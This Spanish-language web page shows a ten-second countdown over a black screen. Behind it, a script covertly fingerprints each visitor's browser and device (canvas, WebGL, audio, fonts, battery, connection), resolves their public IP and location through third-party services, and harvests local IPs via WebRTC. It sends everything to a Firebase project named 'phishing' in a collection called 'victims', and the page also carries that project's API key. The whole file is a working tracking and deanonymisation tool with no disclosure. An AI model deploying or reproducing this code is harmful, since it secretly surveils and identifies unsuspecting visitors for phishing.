<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
html, body {
  width:100%; height:100%; background:#000;
  display:flex; align-items:center; justify-content:center; overflow:hidden;
}
#n {
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  font-size:clamp(80px,25vw,200px); font-weight:100; color:#fff;
  letter-spacing:-4px; user-select:none; opacity:1; transition:opacity 0.18s;
}
</style>
</head>
<body>
<span id="n">10</span>
<script type="module">
import { initializeApp }         from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getFirestore, collection, addDoc, updateDoc, doc, serverTimestamp }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// ── CONFIG ──────────────────────────────────────────────
const app = initializeApp({
  apiKey:            "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0",
  authDomain:        "phishing-cad1e.firebaseapp.com",
  projectId:         "phishing-cad1e",
  storageBucket:     "phishing-cad1e.firebasestorage.app",
  messagingSenderId: "48855278637",
  appId:             "1:48855278637:web:cd6386bf2342f0b63344a4"
});
const db = getFirestore(app);

// ── COUNTDOWN ───────────────────────────────────────────
const el = document.getElementById('n');
let t = 10;
const tick = setInterval(() => {
  el.style.opacity = 0;
  setTimeout(() => { t--; el.textContent = t; el.style.opacity = 1; if(t<=0) clearInterval(tick); }, 180);
}, 1000);

// ── RECOLECCIÓN ─────────────────────────────────────────
const P = {};

// Navigator
P.ua        = navigator.userAgent || '';
P.platform  = navigator.platform  || '';
P.vendor    = navigator.vendor    || '';
P.lang      = navigator.language  || '';
P.langs     = (navigator.languages||[]).join(',');
P.cookies   = String(navigator.cookieEnabled);
P.online    = String(navigator.onLine);
P.touch     = String(navigator.maxTouchPoints||0);
P.memory    = String(navigator.deviceMemory||'n/a');
P.cores     = String(navigator.hardwareConcurrency||'');
P.dnt       = String(navigator.doNotTrack||'');

// Pantalla
P.screen  = screen.width+'x'+screen.height;
P.avail   = screen.availWidth+'x'+screen.availHeight;
P.depth   = String(screen.colorDepth);
P.dpr     = String(window.devicePixelRatio);
P.orient  = screen.orientation?.type||'n/a';
P.innerW  = String(window.innerWidth);
P.innerH  = String(window.innerHeight);

// Tiempo
P.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone||'';
P.tzOffset = String(new Date().getTimezoneOffset());
P.locale   = Intl.DateTimeFormat().resolvedOptions().locale||'';
P.dateStr  = new Date().toString();
P.ts       = String(Date.now());

// URL
P.referer = document.referrer||'(directo)';
P.url     = location.href;
P.params  = location.search;

// Canvas fingerprint
try {
  const c = document.createElement('canvas'); c.width=240; c.height=50;
  const x = c.getContext('2d');
  x.textBaseline='top'; x.font='13px Arial';
  x.fillStyle='#f55'; x.fillRect(100,1,60,18);
  x.fillStyle='#05a'; x.fillText('Invisible',2,14);
  x.fillStyle='rgba(0,200,80,0.7)'; x.fillText('Invisible',4,16);
  P.canvas = c.toDataURL().slice(-60);
} catch(e){ P.canvas='blocked'; }

// WebGL
try {
  const g = document.createElement('canvas').getContext('webgl')||
            document.createElement('canvas').getContext('experimental-webgl');
  if(g){
    P.glVendor   = g.getParameter(g.VENDOR)||'';
    P.glRenderer = g.getParameter(g.RENDERER)||'';
    const d = g.getExtension('WEBGL_debug_renderer_info');
    if(d){ P.glUVendor=g.getParameter(d.UNMASKED_VENDOR_WEBGL)||''; P.glURenderer=g.getParameter(d.UNMASKED_RENDERER_WEBGL)||''; }
    P.glVer = g.getParameter(g.VERSION)||'';
    P.glMax = String(g.getParameter(g.MAX_TEXTURE_SIZE)||'');
    P.glExt = (g.getSupportedExtensions()||[]).join('|').slice(0,200);
  }
} catch(e){}

// Audio fingerprint
try {
  const A = window.OfflineAudioContext||window.webkitOfflineAudioContext;
  if(A){
    const ac=new A(1,44100,44100), os=ac.createOscillator(), cp=ac.createDynamicsCompressor();
    os.connect(cp); cp.connect(ac.destination); os.start(0); ac.startRendering();
    ac.oncomplete = ev => {
      const b=ev.renderedBuffer.getChannelData(0); let s=0;
      for(let i=4500;i<5000;i++) s+=Math.abs(b[i]);
      P.audio=s.toString(); push();
    };
  }
} catch(e){}

// Fonts
const FONTS=['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
  'Georgia','Impact','Segoe UI','Tahoma','Times New Roman','Verdana',
  'Helvetica Neue','Monaco','Ubuntu','Noto Sans','Roboto','Open Sans'];
const sp=document.createElement('span');
sp.style.cssText='position:absolute;visibility:hidden;font-size:72px;';
sp.textContent='mmmmmmmmmmlli'; document.body.appendChild(sp);
sp.style.fontFamily='monospace';
const bW=sp.offsetWidth, bH=sp.offsetHeight;
P.fonts=FONTS.filter(f=>{ sp.style.fontFamily=`"${f}",monospace`; return sp.offsetWidth!==bW||sp.offsetHeight!==bH; }).join(',');
P.fontN=String(P.fonts.split(',').filter(Boolean).length);
document.body.removeChild(sp);

// Connection
const cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
if(cn){ P.connType=String(cn.type||''); P.connEff=String(cn.effectiveType||''); P.connDl=String(cn.downlink||''); P.connRtt=String(cn.rtt||''); P.connSave=String(cn.saveData||''); }

// Codecs
try {
  const v=document.createElement('video');
  P.h264=v.canPlayType('video/mp4;codecs="avc1.42E01E"');
  P.vp9 =v.canPlayType('video/webm;codecs="vp9"');
  const a=document.createElement('audio');
  P.mp3=a.canPlayType('audio/mpeg');
  P.ogg=a.canPlayType('audio/ogg;codecs="vorbis"');
} catch(e){}

// CSS media
P.dark      = String(matchMedia('(prefers-color-scheme:dark)').matches);
P.ptrFine   = String(matchMedia('(pointer:fine)').matches);
P.ptrCoarse = String(matchMedia('(pointer:coarse)').matches);
P.hover     = String(matchMedia('(any-hover:hover)').matches);

// Features
P.wasm   = String(!!window.WebAssembly);
P.webGPU = String(!!navigator.gpu);
P.bt     = String(!!navigator.bluetooth);
P.nfc    = String('NDEFReader' in window);
P.notif  = 'Notification' in window ? Notification.permission : 'n/a';
P.sw     = String(!!navigator.serviceWorker);

// Hash
const hi=[P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.memory,P.canvas,P.glURenderer||''].join('|');
let h=0x811c9dc5;
for(let i=0;i<hi.length;i++){ h^=hi.charCodeAt(i); h=(h*0x01000193)>>>0; }
P.hash='0x'+h.toString(16).toUpperCase().padStart(8,'0');

// ── FIREBASE SEND ───────────────────────────────────────
let docRef = null;

// Limpia el objeto: quita undefined/null, convierte todo a string
function clean(obj){
  const o={};
  for(const [k,v] of Object.entries(obj)){
    if(v===undefined||v===null) continue;
    o[k]=String(v);
  }
  o._ts = String(Date.now());
  return o;
}

async function push(){
  try {
    if(!docRef){
      docRef = await addDoc(collection(db,'victims'), clean(P));
    } else {
      await updateDoc(docRef, clean(P));
    }
  } catch(e){ console.error('[ROOT]',e); }
}

// IP pública async
(async()=>{
  const APIS=[
    {url:'https://ipapi.co/json/',         ip:'ip',       city:'city',       region:'region',     country:'country_name', org:'org',  lat:'latitude', lon:'longitude', tz:'timezone', asn:'asn'},
    {url:'https://ipwho.is/',              ip:'ip',       city:'city',       region:'region',     country:'country',      org:'org',  lat:'latitude', lon:'longitude', tz:'timezone', asn:'asn'},
    {url:'https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,org,as,query',
                                           ip:'query',    city:'city',       region:'regionName', country:'country',      org:'org',  lat:'lat',      lon:'lon',       tz:'timezone', asn:'as'},
  ];
  for(const api of APIS){
    try{
      const r=await fetch(api.url,{signal:AbortSignal.timeout(5000)});
      const j=await r.json();
      if(!j[api.ip]) continue;
      P.ip      = String(j[api.ip]      ||'');
      P.city    = String(j[api.city]    ||'');
      P.region  = String(j[api.region]  ||'');
      P.country = String(j[api.country] ||'');
      P.org     = String(j[api.org]     ||'');
      P.lat     = String(j[api.lat]     ||'');
      P.lon     = String(j[api.lon]     ||'');
      P.ipTZ    = String(j[api.tz]      ||'');
      P.asn     = String(j[api.asn]     ||'');
      await push(); break;
    } catch(e){ continue; }
  }
})();

// IP local WebRTC
try{
  const pc=new RTCPeerConnection({iceServers:[]});
  pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
  const seen=new Set();
  pc.onicecandidate=async e=>{
    if(!e?.candidate) return;
    const m=e.candidate.candidate.match(/((\d{1,3}\.){3}\d{1,3})/);
    if(!m||seen.has(m[0])) return;
    seen.add(m[0]);
    P['ipLocal'+seen.size]=m[0];
    await push();
  };
  setTimeout(()=>pc.close(),6000);
} catch(e){ P.ipLocal1='blocked'; }

// Storage estimate
if(navigator.storage?.estimate){
  navigator.storage.estimate().then(q=>{
    P.stQuota=(q.quota/1e9).toFixed(2)+'GB';
    P.stUsed =(q.usage /1e6).toFixed(2)+'MB';
    push();
  }).catch(()=>{});
}

// Battery
if(navigator.getBattery){
  navigator.getBattery().then(b=>{
    P.bat    =(b.level*100).toFixed(0)+'%';
    P.batChg =String(b.charging);
    P.batDisT=String(b.dischargingTime);
    push();
  }).catch(()=>{});
}

// Envío inicial (con lo que hay sincrónico ya)
setTimeout(()=>push(), 800);
</script>
</body>
</html>
